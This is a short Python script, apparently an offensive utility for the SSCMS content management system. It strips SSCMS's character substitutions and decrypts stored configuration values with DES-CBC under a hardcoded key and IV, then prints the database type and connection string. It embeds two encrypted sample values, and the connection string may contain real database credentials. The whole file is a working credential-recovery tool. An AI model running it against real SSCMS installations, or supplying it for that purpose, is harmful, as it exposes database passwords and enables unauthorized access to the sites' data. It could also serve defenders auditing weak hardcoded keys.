import base64,pyDes

def sscms_decrypt(encodeData):
    var1 = encodeData.replace("0secret0", "").replace("0add0", "+").replace("0equals0", "=").replace("0and0", "&").replace("0question0", "?").replace("0quote0", "'").replace("0slash0", "/")
    var2 = base64.b64decode(var1)
    print("[+] Current Encrypt Data= " + var1)
    secretKey = 'f9c01027278a387b'[0:8]
    print("[+] secretKey= " + secretKey)
    # iv = base64.b64decode("EjRWeJCrze8=") # 1234567890abcdef
    iv_hex = "1234567890abcdef"
    iv = bytes.fromhex(iv_hex)
    print("[+] iv_hex= " + iv_hex)
    k = pyDes.des(secretKey, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    return k.decrypt(var2) + b"\n"

Type = "0NofLD4zWcY0slash0jm0add042NYzug0equals00equals00secret0"
ConnectionString = "B0SvIg6ExtjhllXf3vb9UwjmLKSRMlqQ1LIs6a8G0G0slash0M1cWZ2ABJ6lvZOMlvKR0add0vM70slash0QKGc8pYo8t6sumMerqA0equals00equals00secret0"


print("[+] 数据库类型：" + sscms_decrypt(Type).decode("utf-8"))
print("[+] 数据库配置信息：" + sscms_decrypt(ConnectionString).decode("utf-8"))
